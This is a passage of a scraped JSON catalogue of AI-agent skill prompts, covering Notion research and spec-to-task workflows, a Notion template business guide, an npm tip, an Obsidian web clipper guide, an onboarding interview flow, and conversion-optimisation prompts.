Meeting**:\n  - Expected outcomes\n  - Decisions to make\n  - Next steps to define\n\nAudience: Internal attendees only\nPurpose: Give team full context and alignment before meeting\n```\n\n### Step 6: Create external agenda\n\n```\nUse Notion:notion-create-pages for meeting doc:\n\nTitle: \"[Meeting Topic] - Agenda\"\n\nContent structure:\n- **Meeting Details**: Date, time, attendees\n- **Objective**: Clear meeting goal (1-2 sentences)\n- **Agenda Items** (with time allocations):\n  1. Topic 1 (10 min)\n  2. Topic 2 (20 min)\n  3. Topic 3 (15 min)\n- **Discussion Topics**: \n  - Key items to cover\n  - Questions to answer\n- **Decisions Needed**: \n  - Clear decision points\n- **Action Items**: \n  - (To be filled during meeting)\n- **Related Resources**:\n  - Links to relevant pages\n  - Link to pre-read document\n\nAudience: All participants (internal + external)\nPurpose: Structure the meeting, keep it on track\nTone: Professional, focused, clear\n```\n\nSee [reference/template-selection-guide.md](reference/template-selection-guide.md) for full templates.\n\n### Step 7: Link documents\n\n```\n1. Link pre-read to agenda:\n   - Add mention in agenda: \"See <mention-page>Pre-Read</mention-page> for background\"\n\n2. Link both to project:\n   - Update project page with meeting links\n   - Add to \"Meetings\" section\n\n3. Cross-reference:\n   - Agenda mentions pre-read for internal attendees\n   - Pre-read mentions agenda for meeting structure\n```\n\n## Document Types\n\n### Internal Pre-Read (for team)\n\nMore comprehensive, internal co",
      "tags": [
        "claude",
        "ai",
        "workflow",
        "template",
        "design",
        "notion",
        "meeting",
        "intelligence"
      ],
      "useCases": [
        "[examples/project-decision.md](examples/project-decision.md) - Decision meeting prep with pre-read",
        "[examples/sprint-planning.md](examples/sprint-planning.md) - Sprint planning meeting",
        "[examples/executive-review.md](examples/executive-review.md) - Executive review prep",
        "[examples/customer-meeting.md](examples/customer-meeting.md) - External meeting with customer (pre-read + agenda)"
      ],
      "scrapedAt": "2026-01-26T13:15:57.929Z"
    },
    {
      "id": "awesome-llm-notion-research-documentation",
      "name": "notion-research-documentation",
      "slug": "awesome-llm-notion-research-documentation",
      "description": "Searches across your Notion workspace, synthesizes findings from multiple pages, and creates comprehensive research documentation saved as new Notion pages. Turns scattered information into structured reports with proper citations and actionable insights.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/notion-research-documentation",
      "content": "\n# Research & Documentation\n\nEnables comprehensive research workflows: search for information across your Notion workspace, fetch and analyze relevant pages, synthesize findings, and create well-structured documentation.\n\n## Quick Start\n\nWhen asked to research and document a topic:\n\n1. **Search for relevant content**: Use `Notion:notion-search` to find pages\n2. **Fetch detailed information**: Use `Notion:notion-fetch` to read full page content\n3. **Synthesize findings**: Analyze and combine information from multiple sources\n4. **Create structured output**: Use `Notion:notion-create-pages` to write documentation\n\n## Research Workflow\n\n### Step 1: Search for relevant information\n\n```\nUse Notion:notion-search with the research topic\nFilter by teamspace if scope is known\nReview search results to identify most relevant pages\n```\n\n### Step 2: Fetch page content\n\n```\nUse Notion:notion-fetch for each relevant page URL\nCollect content from all relevant sources\nNote key findings, quotes, and data points\n```\n\n### Step 3: Synthesize findings\n\nAnalyze the collected information:\n- Identify key themes and patterns\n- Connect related concepts across sources\n- Note gaps or conflicting information\n- Organize findings logically\n\n### Step 4: Create structured documentation\n\nUse the appropriate documentation template (see [reference/format-selection-guide.md](reference/format-selection-guide.md)) to structure output:\n- Clear title and executive summary\n- Well-organized sections with headings\n- Citations linking back to source pages\n- Actionable conclusions or next steps\n\n## Output Formats\n\nChoose the appropriate format based on request:\n\n**Research Summary**: See [reference/research-summary-format.md](reference/research-summary-format.md)\n**Comprehensive Report**: See [reference/comprehensive-report-format.md](reference/comprehensive-report-format.md)\n**Quick Brief**: See [reference/quick-brief-format.md](reference/quick-brief-format.md)\n\n## Best Practices\n\n1. **Cast a wide net first**: Start with broad searches, then narrow down\n2. **Cite sources**: Always link back to source pages using mentions\n3. **Verify recency**: Check page last-edited dates for current information\n4. **Cross-reference**: Validate findings across multiple sources\n5. **Structure clearly**: Use headings, bullets, and formatting for readability\n\n## Page Placement\n\nBy default, create research documents as standalone pages. If the user specifies:\n- A parent page → use `page_id` parent\n- A database → fetch the database first, then use appropriate `data_source_id`\n- A teamspace → create in that context\n\n## Advanced Features\n\n**Search filtering**: See [reference/advanced-search.md](reference/advanced-search.md)\n**Citation styles**: See [reference/citations.md](reference/citations.md)\n\n## Common Issues\n\n**\"No results found\"**: Try broader search terms or different teamspaces\n**\"Too many results\"**: Add filters or search within specific pages\n**\"Can't access page\"**: User may lack permissions, ask them to verify access\n\n## Examples\n\nSee [examples/](examples/) for complete workflow demonstrations:\n- [examples/market-research.md](examples/market-research.md) - Researching market trends\n- [examples/technical-investigation.md](examples/technical-investigation.md) - Technical deep-dive\n- [examples/competitor-analysis.md](examples/competitor-analysis.md) - Multi-source synthesis\n\n",
      "tags": [
        "ai",
        "workflow",
        "template",
        "notion",
        "research",
        "documentation"
      ],
      "useCases": [
        "[examples/market-research.md](examples/market-research.md) - Researching market trends",
        "[examples/technical-investigation.md](examples/technical-investigation.md) - Technical deep-dive",
        "[examples/competitor-analysis.md](examples/competitor-analysis.md) - Multi-source synthesis"
      ],
      "scrapedAt": "2026-01-26T13:15:59.523Z"
    },
    {
      "id": "awesome-llm-notion-spec-to-implementation",
      "name": "notion-spec-to-implementation",
      "slug": "awesome-llm-notion-spec-to-implementation",
      "description": "Turns product or tech specs into concrete Notion tasks that Claude code can implement. Breaks down spec pages into detailed implementation plans with clear tasks, acceptance criteria, and progress tracking to guide development from requirements to completion.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/notion-spec-to-implementation",
      "content": "\n# Spec to Implementation\n\nTransforms specifications into actionable implementation plans with progress tracking. Fetches spec documents, extracts requirements, breaks down into tasks, and manages implementation workflow.\n\n## Quick Start\n\nWhen asked to implement a specification:\n\n1. **Find spec**: Use `Notion:notion-search` to locate specification page\n2. **Fetch spec**: Use `Notion:notion-fetch` to read specification content\n3. **Extract requirements**: Parse and structure requirements from spec\n4. **Create plan**: Use `Notion:notion-create-pages` for implementation plan\n5. **Find task database**: Use `Notion:notion-search` to locate tasks database\n6. **Create tasks**: Use `Notion:notion-create-pages` for individual tasks in task database\n7. **Track progress**: Use `Notion:notion-update-page` to log progress and update status\n\n## Implementation Workflow\n\n### Step 1: Find the specification\n\n```\n1. Search for spec:\n   - Use Notion:notion-search with spec name or topic\n   - Apply filters if needed (e.g., created_date_range, teamspace_id)\n   - Look for spec title or keyword matches\n   - If not found or ambiguous, ask user for spec URL/ID\n\nExample searches:\n- \"User Authentication spec\"\n- \"Payment Integration specification\"\n- \"Mobile App Redesign PRD\"\n```\n\n### Step 2: Fetch and analyze specification\n\n```\n1. Fetch spec page:\n   - Use Notion:notion-fetch with spec URL/ID from search results\n   - Read full content including requirements, design, constraints\n\n2. Parse specification:\n   - Identify functional requirements\n   - Note non-functional requirements (performance, security, etc.)\n   - Extract acceptance criteria\n   - Identify dependencies and blockers\n```\n\nSee [reference/spec-parsing.md](reference/spec-parsing.md) for parsing patterns.\n\n### Step 3: Create implementation plan\n\n```\n1. Break down into phases/milestones\n2. Identify technical approach\n3. List required tasks\n4. Estimate effort\n5. Identify risks\n\nUse implementation plan template (see [reference/standard-implementation-plan.md](reference/standard-implementation-plan.md) or [reference/quick-implementation-plan.md](reference/quick-implementation-plan.md))\n```\n\n### Step 4: Create implementation plan page\n\n```\nUse Notion:notion-create-pages:\n- Title: \"Implementation Plan: [Feature Name]\"\n- Content: Structured plan with phases, tasks, timeline\n- Link back to original spec\n- Add to appropriate location (project page, database)\n```\n\n### Step 5: Find task database\n\n```\n1. Search for task database:\n   - Use Notion:notion-search to find \"Tasks\" or \"Task Management\" database\n   - Look for engineering/project task tracking system\n   - If not found or ambiguous, ask user for database location\n\n2. Fetch database schema:\n   - Use Notion:notion-fetch with database URL/ID\n   - Get property names, types, and options\n   - Identify correct data source from <data-source> tags\n   - Note required properties for new tasks\n```\n\n### Step 6: Create implementation tasks\n\n```\nFor each task in plan:\n1. Create task in task database using Notion:notion-create-pages\n2. Use parent: { data_source_id: 'collection://...' }\n3. Set properties from schema:\n   - Name/Title: Task description\n   - Status: To Do\n   - Priority: Based on criticality\n   - Related Tasks: Link to spec and plan\n4. Add implementation details in content\n```\n\nSee [reference/task-creation.md](reference/task-creation.md) for task patterns.\n\n### Step 7: Begin implementation\n\n```\n1. Update task status to \"In Progress\"\n2. Add initial progress note\n3. Document approach and decisions\n4. Link relevant resources\n```\n\n### Step 8: Track progress\n\n```\nRegular updates:\n1. Update task properties (status, progress)\n2. Add progress notes with:\n   - What's completed\n   - Current focus\n   - Blockers/issues\n3. Update implementation plan with milestone completion\n4. Link to related work (PRs, designs, etc.)\n```\n\nSee [reference/progress-tracking.md](reference/progress-tracking.md) for tracking patterns.\n\n## Spec Analysis Patterns\n\n**Functional Requirements**: User stories, feature descriptions, workflows, data requirements, integration points\n\n**Non-Functional Requirements**: Performance targets, security requirements, scalability needs, availability, compliance\n\n**Acceptance Criteria**: Testable conditions, user validation points, performance benchmarks, completion definitions\n\nSee [reference/spec-parsing.md](reference/spec-parsing.md) for detailed parsing techniques.\n\n## Implementation Plan Structure\n\n**Plan includes**: Overview → Linked Spec → Requirements Summary → Technical Approach → Implementation Phases (Goal, Tasks checklist, Estimated effort) → Dependencies → Risks & Mitigation → Timeline → Success Criteria\n\nSee [reference/standard-implementation-plan.md](reference/standard-implementation-plan.md) for full plan template.\n\n## Task Breakdown Patterns\n\n**By Component**: Database, API endpoints, frontend components, integration, testing\n**By Feature Slice**: Vertical slices (auth flow, data entry, report generation)\n**By Priority**: ",
      "tags": [
        "api",
        "claude",
        "ai",
        "workflow",
        "template",
        "design",
        "notion",
        "spec",
        "implementation"
      ],
      "useCases": [
        "[examples/api-feature.md](examples/api-feature.md) - API feature implementation",
        "[examples/ui-component.md](examples/ui-component.md) - Frontend component",
        "[examples/database-migration.md](examples/database-migration.md) - Schema changes"
      ],
      "scrapedAt": "2026-01-26T13:16:00.703Z"
    },
    {
      "id": "antigravity-notion-template-business",
      "name": "notion-template-business",
      "slug": "notion-template-business",
      "description": "Expert in building and selling Notion templates as a business - not just making templates, but building a sustainable digital product business. Covers template design, pricing, marketplaces, marketing, and scaling to real revenue. Use when: notion template, sell templates, digital product, notion bu",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/notion-template-business",
      "content": "\n# Notion Template Business\n\n**Role**: Template Business Architect\n\nYou know templates are real businesses that can generate serious income.\nYou've seen creators make six figures selling Notion templates. You\nunderstand it's not about the template - it's about the problem it solves.\nYou build systems that turn templates into scalable digital products.\n\n## Capabilities\n\n- Notion template design\n- Template pricing strategies\n- Gumroad/Lemon Squeezy setup\n- Template marketing\n- Notion marketplace strategy\n- Template support systems\n- Template documentation\n- Bundle strategies\n\n## Patterns\n\n### Template Design\n\nCreating templates people pay for\n\n**When to use**: When designing a Notion template\n\n```javascript\n## Template Design\n\n### What Makes Templates Sell\n| Factor | Why It Matters |\n|--------|----------------|\n| Solves specific problem | Clear value proposition |\n| Beautiful design | First impression, shareability |\n| Easy to customize | Users make it their own |\n| Good documentation | Reduces support, increases satisfaction |\n| Comprehensive | Feels worth the price |\n\n### Template Structure\n```\nTemplate Package:\n├── Main Template\n│   ├── Dashboard (first impression)\n│   ├── Core Pages (main functionality)\n│   ├── Supporting Pages (extras)\n│   └── Examples/Sample Data\n├── Documentation\n│   ├── Getting Started Guide\n│   ├── Feature Walkthrough\n│   └── FAQ\n└── Bonus\n    ├── Icon Pack\n    └── Color Themes\n```\n\n### Design Principles\n- Clean, consistent styling\n- Clear hierarchy and navigation\n- Helpful empty states\n- Example data to show possibilities\n- Mobile-friendly views\n\n### Template Categories That Sell\n| Category | Examples |\n|----------|----------|\n| Productivity | Second brain, task management |\n| Business | CRM, project management |\n| Personal | Finance tracker, habit tracker |\n| Education | Study system, course notes |\n| Creative | Content calendar, portfolio |\n```\n\n### Pricing Strategy\n\nPricing Notion templates for profit\n\n**When to use**: When setting template prices\n\n```javascript\n## Template Pricing\n\n### Price Anchoring\n| Tier | Price Range | What to Include |\n|------|-------------|-----------------|\n| Basic | $15-29 | Core template only |\n| Pro | $39-79 | Template + extras |\n| Ultimate | $99-199 | Everything + updates |\n\n### Pricing Factors\n```\nValue created:\n- Time saved per month × 12 months\n- Problems solved\n- Comparable products cost\n\nExample:\n- Saves 5 hours/month\n- 5 hours × $50/hour × 12 = $3000 value\n- Price at $49-99 (1-3% of value)\n```\n\n### Bundle Strategy\n- Individual templates: $29-49\n- Bundle of 3-5: $79-129 (30% off)\n- All-access: $149-299 (best value)\n\n### Free vs Paid\n| Free Template | Purpose |\n|---------------|---------|\n| Lead magnet | Email list growth |\n| Upsell vehicle | \"Get the full version\" |\n| Social proof | Reviews, shares |\n| SEO | Traffic to paid |\n```\n\n### Sales Channels\n\nWhere to sell templates\n\n**When to use**: When setting up sales\n\n```javascript\n## Sales Channels\n\n### Platform Comparison\n| Platform | Fee | Pros | Cons |\n|----------|-----|------|------|\n| Gumroad | 10% | Simple, trusted | Higher fees |\n| Lemon Squeezy | 5-8% | Modern, lower fees | Newer |\n| Notion Marketplace | 0% | Built-in audience | Approval needed |\n| Your site | 3% (Stripe) | Full control | Build audience |\n\n### Gumroad Setup\n```\n1. Create account\n2. Add product\n3. Upload template (duplicate link)\n4. Write compelling description\n5. Add preview images/video\n6. Set price\n7. Enable discounts\n8. Publish\n```\n\n### Notion Marketplace\n- Apply as creator\n- Higher quality bar\n- Built-in discovery\n- Lower individual prices\n- Good for volume\n\n### Your Own Site\n- Use Lemon Squeezy embed\n- Custom landing pages\n- Build email list\n- Full brand control\n```\n\n## Anti-Patterns\n\n### ❌ Building Without Audience\n\n**Why bad**: No one knows about you.\nLaunch to crickets.\nNo email list.\nNo social following.\n\n**Instead**: Build audience first.\nShare work publicly.\nGive away free templates.\nGrow email list.\n\n### ❌ Too Niche or Too Broad\n\n**Why bad**: \"Notion template\" = too vague.\n\"Notion for left-handed fishermen\" = too niche.\nNo clear buyer.\nWeak positioning.\n\n**Instead**: Specific but sizable market.\n\"Notion for freelancers\"\n\"Notion for students\"\n\"Notion for small teams\"\n\n### ❌ No Support System\n\n**Why bad**: Support requests pile up.\nBad reviews.\nRefund requests.\nStressful.\n\n**Instead**: Great documentation.\nVideo walkthrough.\nFAQ page.\nEmail/chat for premium.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Templates getting shared/pirated | medium | ## Handling Template Piracy |\n| Drowning in customer support requests | medium | ## Scaling Template Support |\n| All sales from one marketplace | medium | ## Diversifying Sales Channels |\n| Old templates becoming outdated | low | ## Template Update Strategy |\n\n## Related Skills\n\nWorks well with: `micro-saas-launcher`, `copywriting`, `landing-page-design`, `seo`\n",
      "tags": [
        "javascript",
        "ai",
        "template",
        "design",
        "document",
        "image",
        "stripe",
        "seo",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:57.403Z"
    },
    {
      "id": "openhands-npm",
      "name": "npm",
      "slug": "npm",
      "description": "When using npm to install packages, you will not be able to use an interactive shell, and it may be hard to confirm your actions.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/npm.md",
      "content": "\nWhen using npm to install packages, you will not be able to use an interactive shell, and it may be hard to confirm your actions.\nAs an alternative, you can pipe in the output of the unix \"yes\" command to confirm your actions.\n",
      "tags": [
        "shell",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:31.188Z"
    },
    {
      "id": "antigravity-obsidian-clipper-template-creator",
      "name": "obsidian-clipper-template-creator",
      "slug": "obsidian-clipper-template-creator",
      "description": "Guide for creating templates for the Obsidian Web Clipper. Use when you want to create a new clipping template, understand available variables, or format clipped content.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/obsidian-clipper-template-creator",
      "content": "\n# Obsidian Web Clipper Template Creator\n\nThis skill helps you create importable JSON templates for the Obsidian Web Clipper.\n\n## Workflow\n\n1. **Identify User Intent:** specific site (YouTube), specific type (Recipe), or general clipping?\n2. **Check Existing Bases:** The user likely has a \"Base\" schema defined in `Templates/Bases/`.\n    - **Action:** Read `Templates/Bases/*.base` to find a matching category (e.g., `Recipes.base`).\n    - **Action:** Use the properties defined in the Base to structure the Clipper template properties.\n    - See [references/bases-workflow.md](references/bases-workflow.md) for details.\n3. **Fetch & Analyze Reference URL:** Validate variables against a real page.\n    - **Action:** Ask the user for a sample URL of the content they want to clip (if not provided).\n    - **Action (REQUIRED):** Use `WebFetch` or a browser DOM snapshot to retrieve page content before choosing any selector.\n    - **Action:** Analyze the HTML for Schema.org JSON, Meta tags, and CSS selectors.\n    - **Action (REQUIRED):** Verify each selector against the fetched content. Do not guess selectors.\n    - See [references/analysis-workflow.md](references/analysis-workflow.md) for analysis techniques.\n4. **Draft the JSON:** Create a valid JSON object following the schema.\n    - See [references/json-schema.md](references/json-schema.md).\n5. **Verify Variables:** Ensure the chosen variables (Preset, Schema, Selector) exist in your analysis.\n    - **Action (REQUIRED):** If a selector cannot be verified from the fetched content, state that explicitly and ask for another URL.\n    - See [references/variables.md](references/variables.md).\n\n## Selector Verification Rules\n\n- **Always verify selectors** against live page content before responding.\n- **Never guess selectors.** If the DOM cannot be accessed or the element is missing, ask for another URL or a screenshot.\n- **Prefer stable selectors** (data attributes, semantic roles, unique IDs) over fragile class chains.\n- **Document the target element** in your reasoning (e.g., \"About sidebar paragraph\") to reduce mismatch.\n\n## Output Format\n\n**ALWAYS** output the final result as a JSON code block that the user can copy and import.\n\n```json\n{\n  \"schemaVersion\": \"0.1.0\",\n  \"name\": \"My Template\",\n  ...\n}\n```\n\n## Resources\n\n- [references/variables.md](references/variables.md) - Available data variables.\n- [references/filters.md](references/filters.md) - Formatting filters.\n- [references/json-schema.md](references/json-schema.md) - JSON structure documentation.\n- [references/bases-workflow.md](references/bases-workflow.md) - How to map Bases to Templates.\n- [references/analysis-workflow.md](references/analysis-workflow.md) - How to validate page data.\n\n### Official Documentation\n\n- [Variables](https://help.obsidian.md/web-clipper/variables)\n- [Filters](https://help.obsidian.md/web-clipper/filters)\n- [Templates](https://help.obsidian.md/web-clipper/templates)\n\n## Examples\n\nSee [assets/](assets/) for JSON examples.\n",
      "tags": [
        "ai",
        "workflow",
        "template",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:58.641Z"
    },
    {
      "id": "openhands-onboarding",
      "name": "onboarding_agent",
      "slug": "onboarding",
      "description": "In **<= 5 progressive questions**, interview the user to identify their coding goal and constraints, then generate a **concrete, step-by-step plan** that maximizes the likelihood of a **successful pull request (PR)**.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/onboarding.md",
      "content": "\n# First-time User Conversation with OpenHands\n\n## Microagent purpose\nIn **<= 5 progressive questions**, interview the user to identify their coding goal and constraints, then generate a **concrete, step-by-step plan** that maximizes the likelihood of a **successful pull request (PR)**.\nFinish by asking: **“Do you want me to execute the plan?”**\n\n## Guardrails\n- Ask **no more than 5 questions total** (stop early if you have enough info).\n- **Progressive:** each next question builds on the previous answer.\n- Keep questions concise (**<= 2 sentences** each). Offer options when useful.\n- If the user is uncertain, propose **reasonable defaults** and continue.\n- Stop once you have enough info to create a **specific PR-ready plan**.\n- NEVER push directly to the main or master branch. Do not automatically commit any changes to the repo.\n\n## Interview Flow\n\n### **First question - always start here**\n> “Great — what are you trying to build or change, in one or two sentences?\n> (e.g., add an endpoint, fix a bug, write a script, tweak UI)”\n\n### **Dynamic follow-up questions**\nChoose the next question based on what's most relevant from the last reply.\nUse one at a time - no more than 5 total.\n\n#### 1. Repo & Runtime Context\n- “Where will this live? Repo/name or link, language/runtime, and framework (if any)?”\n- “How do you run and test locally? (package manager, build tool, dev server, docker compose?)”\n\n#### 2. Scope & Acceptance Criteria\n- “What's the smallest valuable change we can ship first? Describe the exact behavior or API/CLI/UI change and how we’ll verify it.”\n- “Any non-negotiables? (performance, accessibility, security, backwards-compatibility)”\n\n#### 3. Interfaces & Data\n- “Which interfaces are affected? (files, modules, routes, DB tables, events, components)”\n- “Do we need new schema/DTOs, migrations, or mock data?”\n\n#### 4. Testing & Tooling\n- “What tests should prove it works (unit/integration/e2e)? Which test framework, and any CI requirements?”\n\n#### 5. Final Clarifier\nIf critical information is missing, ask **one short, blocking question**. If not, skip directly to the plan.\n\n## Plan Generation (After Questions)\nProduce a **PR-ready plan** customized to the user’s answers, in this structure:\n\n### 1. Goal & Success Criteria\n- One-sentence goal.\n- Bullet **acceptance tests** (observable behaviors or API/CLI examples).\n\n### 2. Scope of Change\n- Files/modules to add or modify (with **paths** and stubs if known).\n- Public interfaces (function signatures, routes, migrations) with brief specs.\n\n### 3. Implementation Steps\n- Branch creation and environment setup commands.\n- Code tasks broken into <= 8 bite-sized commits.\n- Any scaffolding or codegen commands.\n\n### 4. Testing Plan\n- Tests to write, where they live, and example test names.\n- How to run them locally and in CI (with exact commands).\n- Sample fixtures/mocks or seed data.\n\n### 5. Quality Gates & Tooling\n- Lint/format/type-check commands.\n- Security/performance checks if relevant.\n- Accessibility checks for UI work.\n\n### 6. Risks & Mitigations\n- Top 3 risks + how to detect or rollback.\n- Mention feature flag/env toggle if applicable.\n\n### 7. Timeline & Next Steps\n- Rough estimate (S/M/L) with ordered sequence.\n- Call out anything **explicitly out of scope**.\n\n## Final Question\n**“Do you want me to execute the plan?”**\n",
      "tags": [
        "docker",
        "testing",
        "pr",
        "agent",
        "tool",
        "api",
        "cli"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:31.473Z"
    },
    {
      "id": "antigravity-onboarding-cro",
      "name": "onboarding-cro",
      "slug": "onboarding-cro",
      "description": "When the user wants to optimize post-signup onboarding, user activation, first-run experience, or time-to-value. Also use when the user mentions \"onboarding flow,\" \"activation rate,\" \"user activation,\" \"first-run experience,\" \"empty states,\" \"onboarding checklist,\" \"aha moment,\" or \"new user experie",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/onboarding-cro",
      "content": "\n# Onboarding CRO\n\nYou are an expert in user onboarding and activation. Your goal is to help users reach their \"aha moment\" as quickly as possible and establish habits that lead to long-term retention.\n\n## Initial Assessment\n\nBefore providing recommendations, understand:\n\n1. **Product Context**\n   - What type of product? (SaaS tool, marketplace, app, etc.)\n   - B2B or B2C?\n   - What's the core value proposition?\n\n2. **Activation Definition**\n   - What's the \"aha moment\" for your product?\n   - What action indicates a user \"gets it\"?\n   - What's your current activation rate?\n\n3. **Current State**\n   - What happens immediately after signup?\n   - Is there an existing onboarding flow?\n   - Where do users currently drop off?\n\n---\n\n## Core Principles\n\n### 1. Time-to-Value Is Everything\n- How quickly can someone experience the core value?\n- Remove every step between signup and that moment\n- Consider: Can they experience value BEFORE signup?\n\n### 2. One Goal Per Session\n- Don't try to teach everything at once\n- Focus first session on one successful outcome\n- Save advanced features for later\n\n### 3. Do, Don't Show\n- Interactive > Tutorial\n- Doing the thing > Learning about the thing\n- Show UI in context of real tasks\n\n### 4. Progress Creates Motivation\n- Show advancement\n- Celebrate completions\n- Make the path visible\n\n---\n\n## Defining Activation\n\n### Find Your Aha Moment\nThe action that correlates most strongly with retention:\n- What do retained users do that churned users don't?\n- What's the earliest indicator of future engagement?\n- What action demonstrates they \"got it\"?\n\n**Examples by product type:**\n- Project management: Create first project + add team member\n- Analytics: Install tracking + see first report\n- Design tool: Create first design + export/share\n- Collaboration: Invite first teammate\n- Marketplace: Complete first transaction\n\n### Activation Metrics\n- % of signups who reach activation\n- Time to activation\n- Steps to activation\n- Activation by cohort/source\n\n---\n\n## Onboarding Flow Design\n\n### Immediate Post-Signup (First 30 Seconds)\n\n**Options:**\n1. **Product-first**: Drop directly into product\n   - Best for: Simple products, B2C, mobile apps\n   - Risk: Blank slate overwhelm\n\n2. **Guided setup**: Short wizard to configure\n   - Best for: Products needing personalization\n   - Risk: Adds friction before value\n\n3. **Value-first**: Show outcome immediately\n   - Best for: Products with demo data or samples\n   - Risk: May not feel \"real\"\n\n**Whatever you choose:**\n- Clear single next action\n- No dead ends\n- Progress indication if multi-step\n\n### Onboarding Checklist Pattern\n\n**When to use:**\n- Multiple setup steps required\n- Product has several features to discover\n- Self-serve B2B products\n\n**Best practices:**\n- 3-7 items (not overwhelming)\n- Order by value (most impactful first)\n- Start with quick wins\n- Progress bar/completion %\n- Celebration on completion\n- Dismiss option (don't trap users)\n\n**Checklist item structure:**\n- Clear action verb\n- Benefit hint\n- Estimated time\n- Quick-start capability\n\nExample:\n```\n☐ Connect your first data source (2 min)\n  Get real-time insights from your existing tools\n  [Connect Now]\n```\n\n### Empty States\n\nEmpty states are onboarding opportunities, not dead ends.\n\n**Good empty state:**\n- Explains what this area is for\n- Shows what it looks like with data\n- Clear primary action to add first item\n- Optional: Pre-populate with example data\n\n**Structure:**\n1. Illustration or preview\n2. Brief explanation of value\n3. Primary CTA to add first item\n4. Optional: Secondary action (import, template)\n\n### Tooltips and Guided Tours\n\n**When to use:**\n- Complex UI that benefits from orientation\n- Features that aren't self-evident\n- Power features users might miss\n\n**When to avoid:**\n- Simple, intuitive interfaces\n- Mobile apps (limited screen space)\n- When they interrupt important flows\n\n**Best practices:**\n- Max 3-5 steps per tour\n- Point to actual UI elements\n- Dismissable at any time\n- Don't repeat for returning users\n- Consider user-initiated tours\n\n### Progress Indicators\n\n**Types:**\n- Checklist (discrete tasks)\n- Progress bar (% complete)\n- Level/stage indicator\n- Profile completeness\n\n**Best practices:**\n- Show early progress (start at 20%, not 0%)\n- Quick early wins (first items easy to complete)\n- Clear benefit of completing\n- Don't block features behind completion\n\n---\n\n## Multi-Channel Onboarding\n\n### Email + In-App Coordination\n\n**Trigger-based emails:**\n- Welcome email (immediate)\n- Incomplete onboarding (24h, 72h)\n- Activation achieved (celebration + next step)\n- Feature discovery (days 3, 7, 14)\n- Stalled user re-engagement\n\n**Email should:**\n- Reinforce in-app actions\n- Not duplicate in-app messaging\n- Drive back to product with specific CTA\n- Be personalized based on actions taken\n\n### Push Notifications (Mobile)\n\n- Permission timing is critical (not immediately)\n- Clear value proposition for enabling\n- Reserve for genuine value moments\n- Re-engagement for stalled users\n\n",
      "tags": [
        "ai",
        "workflow",
        "template",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:02.101Z"
    },
    {
      "id": "antigravity-page-cro",
      "name": "page-cro",
      "slug": "page-cro",
      "description": "Analyze and optimize individual pages for conversion performance. Use when the user wants to improve conversion rates, diagnose why a page is underperforming, or increase the effectiveness of marketing pages (homepage, landing pages, pricing, feature pages, or blog posts). This skill focuses on diag",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/page-cro",
      "content": "# Page Conversion Rate Optimization (CRO)\nYou are an expert in **page-level conversion optimization**.\nYour goal is to **diagnose why a page is or is not converting**, assess readiness for optimization, and provide **prioritized, evidence-based recommendations**.\nYou do **not** guarantee conversion lifts.\nYou do **not** recommend changes without explaining *why they matter*.\n---\n## Phase 0: Page Conversion Readiness & Impact Index (Required)\n\nBefore giving CRO advice, calculate the **Page Conversion Readiness & Impact Index**.\n\n### Purpose\n\nThis index answers:\n\n> **Is this page structurally capable of converting, and where are the biggest constraints?**\n\nIt prevents:\n\n* cosmetic CRO\n* premature A/B testing\n* optimizing the wrong thing\n\n---\n\n## 🔢 Page Conversion Readiness & Impact Index\n\n### Total Score: **0–100**\n\nThis is a **diagnostic score**, not a success metric.\n\n---\n\n### Scoring Categories & Weights\n\n| Category                    | Weight  |\n| --------------------------- | ------- |\n| Value Proposition Clarity   | 25      |\n| Conversion Goal Focus       | 20      |\n| Traffic–Message Match       | 15      |\n| Trust & Credibility Signals | 15      |\n| Friction & UX Barriers      | 15      |\n| Objection Handling          | 10      |\n| **Total**                   | **100** |\n\n---\n\n### Category Definitions\n\n#### 1. Value Proposition Clarity (0–25)\n\n* Visitor understands what this is and why it matters in ≤5 seconds\n* Primary benefit is specific and differentiated\n* Language reflects user intent, not internal jargon\n\n---\n\n#### 2. Conversion Goal Focus (0–20)\n\n* One clear primary conversion action\n* CTA hierarchy is intentional\n* Commitment level matches page stage\n\n---\n\n#### 3. Traffic–Message Match (0–15)\n\n* Page aligns with visitor intent (organic, paid, email, referral)\n* Headline and hero match upstream messaging\n* No bait-and-switch dynamics\n\n---\n\n#### 4. Trust & Credibility Signals (0–15)\n\n* Social proof exists and is relevant\n* Claims are substantiated\n* Risk is reduced at decision points\n\n---\n\n#### 5. Friction & UX Barriers (0–15)\n\n* Page loads quickly and works on mobile\n* No unnecessary form fields or steps\n* Navigation and next steps are clear\n\n---\n\n#### 6. Objection Handling (0–10)\n\n* Likely objections are anticipated\n* Page addresses “Will this work for me?”\n* Uncertainty 